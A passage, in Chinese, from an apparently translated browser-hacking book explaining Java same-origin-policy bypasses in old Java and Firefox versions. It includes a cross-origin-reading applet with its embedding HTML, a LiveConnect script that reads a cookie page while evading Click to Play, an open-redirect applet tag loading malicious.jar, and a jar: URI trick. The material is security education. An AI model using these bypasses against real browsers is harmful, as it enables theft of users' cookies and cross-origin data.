
在下面的 Java 小程序中，当调用 getInfo() 方法时，它会创建一个 `java.net.URL` 对象的新实例，用于从 `www.browserhacker.com` 上托管的特定 URL 获取内容：

```java
import java.applet.*;
import java.awt.*;
import java.net.*;
import java.util.*;
import java.io.*;

public class javaAppletSop extends Applet{
 public javaAppletSop() {
  super();
  return;
 }
 
 public static String getInfo(){
  String result = "";
  try {
    URL url = new URL("http://www.browserhacker.com" + 
    "/demos/secret_page.html");
    BufferedReader in = new BufferedReader(
        new InputStreamReader(url.openStream()));

    String inputLine;
    while ((inputLine = in.readLine()) != null)
     result += inputLine;
     in.close();
    }
    catch (Exception exception){
     result = "Exception: " + exception.toString();
    }
    return result;
 }
}
```

现在编译前面的小程序，并在 `www.browservictim.com` 上的 HTML 页面中嵌入它。随后，使用 Firefox 浏览器打开该页面，并使用 Java 插件版本 1.6u45 或 1.7u17。可以使用以下 HTML 来嵌入小程序：

```html
<html>
<!-- 
Tested on:
 - Java 1.7u17 and Firefox (CtP allowed)
 - Java 1.6u45 and IE 8
-->
<body>
<embed id='javaAppletSop' code='javaAppletSop' 
type='application/x-java-applet' 
codebase='http://browservictim.com/' height='0' 
width='0'name='javaAppletSop'></embed>
<!-- use the following one for IE -->
<!-- 
<applet id='javaAppletSop' code='javaAppletSop' 
codebase='http://browservictim.com/' height='0' 
width='0'name='javaAppletSop'></applet>
-->
<script>
// 5 secs timeout to wait for the user to allow CtP
function getInfo(){
 output = document.javaAppletSop.getInfo();
 if (output) alert(output);
}
setTimeout(function(){getInfo();},5000);
</script>
</body>
</html>
```

在图 4-1 中的弹出框里，你可以看到从 www.browservictim.com 正确获取 demos/secret_page.html 内容，而 Java 不认为这是不同的来源。

start figure 

[**Figure 4-1:**](#c04.html#figureanchor4-1) Unsigned applet is able to retrieve content cross-origin.

![c04f001.tif](image_fi/662090c04/c04f001.png)

end figure 

一个重要的考虑因素是小程序使用 URL、BufferedReader 和 InputStreamReader 对象所需的权限。在 Java 1.6 中，正常的未签名小程序即可，无需用户干预（除了最新的浏览器版本，其中所有未签名小程序都需要用户干预才能运行）。在 Java 1.7 中，小程序需要显式的用户权限才能运行，这导致必须点击“运行”按钮来接受其执行。

这归功于 Oracle 在 2013 年早期的 Java 1.7 更新 11 中实现的小程序递送机制的变更。现在，用户必须显式使用“Click to Play”功能来运行已签名和未签名的小程序。该功能的最初实现被 Immunity2 绕过，随后 Oracle 发布了补丁。此外，从 Java 7u21 开始，Oracle 更新了“Click to Play”安全对话框，根据小程序类型区分显示给用户的信息。

尽管如此，从最终用户的角度来看，两个在 Java 版本大于 7u21 的已签名小程序之间的区别在于一个词。如果已签名小程序请求运行在沙箱之外，显示给用户的信息将是“…will run with unrestricted access …”。如果已签名小程序是沙箱化的，显示的信息将是“…will run with restricted access …”。你可以清晰地看到这两条信息之间的细微差别。关键问题是有多少用户会注意到这种差别？不过，“Click to Play”实际上消除了 Java 作为悄悄绕过同源策略（SOP）的选项。

Mario Heiderich 发现，当 Firefox 中 LiveConnect5 API 和 Java 插件可用时，会出现一个 Java 奇特之处。LiveConnect 使得 Firefox 15 及更早版本的 Packages DOM 对象可用。该对象允许你直接在 DOM 中调用 Java 对象和方法。下面的示例展示了使用 Packages DOM 对象进行绕过的方法：

```javascript
<script>
var url = new Packages.java.net.URL("http://browservictim.com/cookie.php");
var is = new Packages.java.io.BufferedReader(
new Packages.java.io.InputStreamReader(url.openStream()));
var data = '';
while ((l = is.readLine()) != null) {
data+=l;
}
alert(data)
</script>
```

当使用 Packages 来调用这段 Java 代码时，会产生一个潜在危险的副作用。如果代码在 Java 1.7 与 Firefox 15 或更早版本中执行，则前面讨论的“Click to Play”功能完全被绕过。如果浏览器是 Firefox 并且启用了 LiveConnect API，这种静默行为极大地提高了 Java 小程序用于 SOP 绕过的实用性。

另一个有趣的 Java SOP 绕过漏洞是 CVE-2011-3546，它在 2011 年底经过十个月的修复。类似的 SOP 绕过也在 Adobe Reader 中被发现，将在下一节讨论。Neal Poole 发现，如果用于加载小程序的资源返回 301 或 302 重定向，小程序的来源被评估为重定向的来源，而不是目的地。考虑以下代码：

```html
<applet
code="malicious.class"
archive="http://browservictim.com?redirect_to=
http://browserhacker.com/malicious.jar"
width="100" height="100"></applet> 
```

你理所当然地期望如果小程序尝试访问 browservictim.com 时，同源策略会被强制执行。当然，在这种情况下应该抛出 SOP 违规错误。这正是一个非缺陷的 SOP 实现应该表现的方式，因为小程序的来源是 browserhacker.com。相反，Java 版本 1.7 和 1.6 update 27（以及更早版本）将重定向的来源视为有效的来源。实际上，这意味着你可以读取受开放重定向漏洞影响的所有来源的内容。小程序会从重定向目的地（受攻击方控制的网站）加载，而重定向来源是受害者的来源（易受开放重定向影响）。

Frederik Braun7 发现了另一个在 Java 版本 1.7 Update 5 及更早版本中的有趣的 SOP 绕过漏洞，Oracle 随后在 Java 1.7 Update 9 中修复了该漏洞。该绕过利用了 Java 的 URL 对象（前面示例中也使用了该对象），该对象黑名单了使用 ftp 和 file URI 方案进行跨来源请求。尽管 jar 方案被允许，这使得你可以创建一个完全有效的 URI，例如：

```
jar:http://browserhacker.com/secret.jar
```

这些 jar URI 可以在创建新的 URL 对象时使用。在这种情况下，同源策略没有得到强制执行，因此从 browserhacker.com 的未签名 Java 小程序可以请求不同来源的 JAR 文件，从而读取其内容。

这种 SOP 绕过的影响不仅仅局限于 JAR 文件。JAR 格式本质上是带有 Manifest 和 META-INF 目录的 ZIP 文件。Microsoft Office 和 Open Office 文档格式也是同样的结构，这意味着你可以使用这种 SOP 绕过来读取任何 docx、odt、jar 以及本质上基于 zip 格式的任何压缩文件。

下面的代码可以用于通过前面讨论的 SOP 绕过方法读取 Open Office 文档的内容：

``` 
```
